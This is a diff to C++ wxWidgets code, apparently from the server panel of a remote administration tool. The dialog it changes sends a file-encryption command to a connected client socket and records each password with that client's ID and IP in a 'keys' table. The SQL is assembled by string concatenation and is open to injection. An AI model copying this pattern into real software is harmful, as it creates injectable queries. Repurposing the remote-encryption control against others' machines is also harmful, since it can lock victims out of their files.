@@ -1,15 +1,21 @@
 #include "file_encryption.hpp"
 #include "panel_file_manager.hpp"
+#include "server.hpp"
 #include "misc.hpp"
+
+extern Servidor* p_Servidor;
 
 wxBEGIN_EVENT_TABLE(frameEncryption, wxFrame)
 	EVT_BUTTON(EnumIDS::ID_FM_BTN_Random, frameEncryption::OnGenerarPass)
 	EVT_BUTTON(EnumIDS::ID_FM_BTN_Crypt_Exec, frameEncryption::OnExecCrypt)
 wxEND_EVENT_TABLE()
 
-frameEncryption::frameEncryption(wxWindow* pParent, std::string strPath) :
+frameEncryption::frameEncryption(wxWindow* pParent, std::string _strPath, std::string _strID, std::string _strIP, SOCKET _sck) :
 	wxFrame(pParent, wxID_ANY, "Encriptar/Desencriptar Archivo", wxDefaultPosition, wxDefaultSize, wxDD_DEFAULT_STYLE) {
-	this->p_strPath = strPath;
+	this->p_strPath = _strPath;
+	this->strID = _strID;
+	this->strIP = _strIP;
+	this->sckCliente = _sck;
 	
 	wxArrayString selection;
 	selection.Insert("Encriptar", 0);
@@ -82,27 +88,23 @@ void frameEncryption::OnExecCrypt(wxCommandEvent& event) {
 	strComando.append(1, CMD_DEL);
 	strComando += this->txt_Pass->GetValue();
 
-	ListCtrlManager* list_parent = (ListCtrlManager*)this->GetParent();
+	p_Servidor->cChunkSend(this->sckCliente, strComando.c_str(), strComando.size(), 0, false, EnumComandos::FM_Crypt_Archivo);
 
-	if (list_parent) {
-		list_parent->itemp->EnviarComando(strComando, EnumComandos::FM_Crypt_Archivo);
-		
-		//Agregar a BD si es para cifrar
-		if (this->rdio_Options->GetSelection() == 0) {
-			time_t temp = time(0);
-			struct tm* timeptr = localtime(&temp);
+	//Agregar a BD si es para cifrar
+	if (this->rdio_Options->GetSelection() == 0) {
+		time_t temp = time(0);
+		struct tm* timeptr = localtime(&temp);
 
-			std::string strFecha = std::to_string(timeptr->tm_mday);
-			strFecha += "/" + std::to_string(timeptr->tm_mon);
-			strFecha += "/" + std::to_string(timeptr->tm_year);
-			std::string strCMD = "INSERT INTO keys (id, ip, nombre, fecha, pass) VALUES('";
-			strCMD += list_parent->itemp->strID + "', '";
-			strCMD += list_parent->itemp->strIP + "', '";
-			strCMD += this->p_strPath + "', '";
-			strCMD += strFecha + "', '";
-			strCMD += this->txt_Pass->GetValue() + "');";
+		std::string strFecha = std::to_string(timeptr->tm_mday);
+		strFecha += "/" + std::to_string(timeptr->tm_mon);
+		strFecha += "/" + std::to_string(timeptr->tm_year);
+		std::string strCMD = "INSERT INTO keys (id, ip, nombre, fecha, pass) VALUES('";
+		strCMD += this->strID + "', '";
+		strCMD += this->strIP + "', '";
+		strCMD += this->p_strPath + "', '";
+		strCMD += strFecha + "', '";
+		strCMD += this->txt_Pass->GetValue() + "');";
 
-			this->Exec_SQL(strCMD.c_str());
-		}
+		this->Exec_SQL(strCMD.c_str());
 	}
 }
